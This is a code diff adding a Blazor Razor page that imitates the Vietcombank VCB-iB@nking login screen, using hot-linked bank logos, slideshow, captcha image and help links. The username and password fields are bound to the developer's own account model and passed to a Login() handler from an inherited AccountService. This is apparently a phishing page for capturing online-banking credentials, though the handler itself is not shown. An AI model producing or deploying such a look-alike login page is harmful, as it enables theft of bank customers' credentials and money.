@@ -1,0 +1,108 @@
+﻿@page "/a"
+@inherits Services.AccountService
+
+<div id="pageContainer">
+    <div class="pageContainerInner">
+        <div class="MainContent">
+            <div class="container containerfix">
+                <div class="wrap loginContent">
+                    <div class="vcbMainContent">
+                        <div class="row no-gutters">
+                            <div id="vcbSlideShow" class="d-none d-xl-block carousel slide col-12 col-xl-8" data-ride="carousel">
+                                <div class="carousel-inner">
+                                    <div class="carousel-item active">
+                                        <img class="img-fluid" src="https://www.vietcombank.com.vn/IBanking20/assets/images/slideshow/VCB-Visa-Business.jpg" />
+                                    </div>
+                                </div>
+                                <ol class="carousel-indicators">
+                                    <li data-target="#vsbSlideShow" data-slide-to="0" class=""></li>
+                                    <li data-target="#vsbSlideShow" data-slide-to="1" class=""></li>
+                                    <li data-target="#vsbSlideShow" data-slide-to="2" class=""></li>
+                                    <li data-target="#vsbSlideShow" data-slide-to="3" class=""></li>
+                                </ol>
+                            </div>
+                            <section id="vcbLogin" class="col-12 col-xl-4 d-flex align-items-center">
+                                <div class="vcbLogin card p-2">
+                                    <div class="card-body">
+                                        <div class="loginHeading text-end mb-3">
+                                            <div class="loginLogo mb-2">
+                                                <img class="img-fluid" width="225" src="https://www.vietcombank.com.vn/IBanking20/assets/images/logo-login.png" />
+                                            </div>
+                                            <div class="logoText text-uppercase font-family-medium text-primary"> Ngân hàng trực tuyến </div>
+                                            <div class="logoText font-family-bold text-primary"> <b>VCB - iB@nking</b> </div>
+                                        </div>
+                                        <form name="aspnetForm" method="post" id="aspnetForm" class="needs-validation" novalidate>
+                                            <div class="form-group">
+                                                <input name="username" type="text" id="username" class="form-control" placeholder="Tên truy cập" @bind="account.Username"/>
+                                            </div>
+                                            <div class="form-group">
+                                                <input name="password" type="password" id="password" class="form-control" placeholder="Mật khẩu" @bind="account.Password"/>
+                                            </div>
+                                            <div class="form-row">
+                                                <div class="col-7">
+                                                    <input name="capcha" type="text" id="capcha" class="form-control" placeholder="Nhập số bên"/>
+                                                </div>
+                                                <div class="col-5">
+                                                    <div class="d-flex justify-content-end">
+                                                        <div class="imageCapcha mt-2">
+                                                            <img src="https://www.vietcombank.com.vn/IBanking20/Captcha/JpegImage.ashx?code=goaamamiaiyw&ts=214045" id="ctl00_Content_Login_Captcha_Captcha" class="img-fluid captcha myCaptcha" title="Chuỗi bảo mật" alt="Chuỗi bảo mật">
+                                                        </div>
+                                                        <div class="btn p-1 ml-2">
+                                                            <img src="https://www.vietcombank.com.vn/IBanking20/assets/images/icons/refresh-icon.png" title="Reload" alt="Reload" id="capchaReload"/>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="mt-2 mb-2 text-center">
+                                                <div></div>
+                                                <div></div>
+                                            </div>
+                                            <div class="mb-3">
+                                                <button type="button" name="LoginBtn" value="Đăng nhập" id="LoginBtn" class="btn btn-success btn-login" @onclick="() => Login()">Đăng nhập</button>
+                                            </div>
+                                        </form>
+                                        <div class="loginLink">
+                                            <ul class="list-unstyled">
+                                                <li>
+                                                    <a id="LoginItem" href="https://portal.vietcombank.com.vn/FAQs/Pages/hoi-dap-to-chuc.aspx?devicechannel=default&amp;cc=C3DC4538F800791A62E1C8DBA69CB1C1" target="none">
+                                                        Câu hỏi thường gặp
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a id="LoginItem" href="https://portal.vietcombank.com.vn/FAQs/Pages/hoi-dap-to-chuc.aspx?devicechannel=default&amp;cc=C3DC4538F800791A62E1C8DBA69CB1C1" target="none">
+                                                        Hướng dẫn sử dụng (Tổ chức)
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a id="LoginItem" href="https://portal.vietcombank.com.vn/FAQs/Pages/hoi-dap-to-chuc.aspx?devicechannel=default&amp;cc=C3DC4538F800791A62E1C8DBA69CB1C1" target="none">
+                                                        Điều khoản sử dụng
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a id="LoginItem" href="https://portal.vietcombank.com.vn/FAQs/Pages/hoi-dap-to-chuc.aspx?devicechannel=default&amp;cc=C3DC4538F800791A62E1C8DBA69CB1C1" target="none">
+                                                        Liên hệ
+                                                    </a>
+                                                </li>
+                                            </ul>
+                                        </div>
+                                        <div class="bottom clearfix mt-4">
+                                            <div class="d-flex align-items-center float-start">
+                                                <span class="icons mr-2">
+                                                    <i class="fa fa-volume-control-phone" aria-hidden="true"></i>
+                                                </span>
+                                                1900 545413
+                                            </div>
+                                            <a id="LoginLanguage" class="float-end" href="/IBanking20/default.aspx?&amp;lang=en&amp;cc=C3DC4538F800791A62E1C8DBA69CB1C1">
+                                                <img width="32" height="24" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e2/Flag_of_the_United_States_%28Pantone%29.svg/285px-Flag_of_the_United_States_%28Pantone%29.svg.png" alt="" syle="border-width:0px" />    
+                                            </a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </section>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
